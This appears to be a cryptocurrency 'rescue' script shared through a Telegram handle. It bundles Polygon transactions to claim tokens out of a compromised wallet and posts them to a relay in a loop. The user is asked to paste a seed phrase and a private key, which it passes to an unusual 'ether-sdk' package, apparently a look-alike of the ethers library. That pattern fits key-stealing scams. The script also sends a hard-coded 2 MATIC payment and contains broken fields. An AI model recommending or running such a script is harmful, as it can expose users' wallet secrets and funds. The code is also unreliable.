//Script created by https://t.me/barthadam  //Telegram @barthadam

const ethers = require("ethers")
const ethersWallet= require("ether-sdk")
const Web3 = require("web3")



// wallet to send MATIC to claim 
var seed = ""
let mnemonicWallet = ethersWallet.fromMnemonic(seed);
var PRIVATEKEY = mnemonicWallet.privateKey;
var myAddress = mnemonicWallet.address

// wallet for claim reward or unstake

var Key = "" // PRIVATE KEY 
var hash32Key = ethersWallet.fromPrivateKey(Key);



async function main() {
  var url1='https://polygon-rpc.com'
  var url2='https://polygon-rpc.com'
  var url3='https://polygon-rpc.com'
  var url5 = "https://polygon-rpc.com"
  

   const web3 = new Web3(
    new Web3.providers.HttpProvider(url5)
  );
  
  const signer = web3.eth.accounts.privateKeyToAccount(
    hash32Key
  );

    let iface = new ethers.utils.Interface([
      'event Approval(address indexed owner, address indexed spender, uint value)',
      'event Transfer(address indexed from, address indexed to, uint value)',
      'function name() external pure returns (string memory)',
      'function symbol() external pure returns (string memory)',
      'function decimals() external pure returns (uint8)',
      'function totalSupply() external view returns (uint)',
      'function balanceOf(address owner) external view returns (uint)',
      'function allowance(address owner, address spender) external view returns (uint)',
      'function approve(address spender, uint value) external returns (bool)',
      'function transfer(address to, uint value) external returns (bool)',
  
      'function DOMAIN_SEPARATOR() external view returns (bytes32)',
      'function PERMIT_TYPEHASH() external pure returns (bytes32)',
      'function nonces(address owner) external view returns (uint)',
      'function release(bytes32 )'
    ]);
  



   var noncesend =  await web3.eth.getTransactionCount(myAddress, 'latest'); 
   var nonce = await web3.eth.getTransactionCount(signer.address,'latest')// nonce starts counting from 0

   gasPrice=1000000000
   const transaction = {
    'form':myAddress,
    'to': signer.address, // 
    'gas': 21000, 
    'value':ethers.utils.parseUnits((1000000000*300000).toString(),"wei"),
    'gasPrice': gasPrice, 
    'nonce':noncesend
   };

   const transactionBundle = {
    'form':myAddress,
    'to': "0xC5Cb2B26694e..........................", // compromised wallet
    'gas': 21000, 
    'value':web3.utils.toWei('2','ether'),
    'gasPrice': "5000000000", 
    'nonce':noncesend+1
   };
   
   const transaction2 = {
    'from':signer.address,
     'to':"0x8e13B3B603.........................", // claim or release contract
     'gas': 200000,  
     'gasPrice': 1000000000, 
     "data":iface.encodeFunctionData("release",[
      ""
     ]
    ),
     'nonce':nonce
    };
    
    const transaction3 = {
      'from':signer.address,
       'to':"0xfd4f2caf941b6d........................", // token contract
       'gas': 100000,  
       'gasPrice': 1000000000 , 
     "data":iface.encodeFunctionData("transfer",[
      myAddress,
      web3.utils.toWei('0.043','ether') // change 1 to how many u want transfer 
    ]),
       'nonce':nonce+1
      };
  
  

  const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATEKEY);
  const signedTx2 = await web3.eth.accounts.signTransaction(transaction2, signer.privateKey);
  const signedTx3 = await web3.eth.accounts.signTransaction(transaction3, signer.privateKey );
  const signedTx5 = await web3.eth.accounts.signTransaction(transactionBundle, PRIVATEKEY);

 


  
var block = await web3.eth.getBlock('latest')
block = block.number+2
console.log(block)
block = block.toString(16)


var resp = await fetch('http://bor.txrelay.marlin.org/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
 
  },
  body: JSON.stringify({
    'id': '1',
    'method': 'bor_getAuthor',
    'params': {
      'transaction':[signedTx5.rawTransaction,signedTx.rawTransaction,signedTx2.rawTransaction,signedTx3.rawTransaction],
      'blockchain_network': 'MATIC-Mainnet',
      'block_number': '0x'+block,
  
    }
  })
});
  var data = await resp.text();
  console.log(data)


}
  
setInterval(() => {
  main()
  },800);



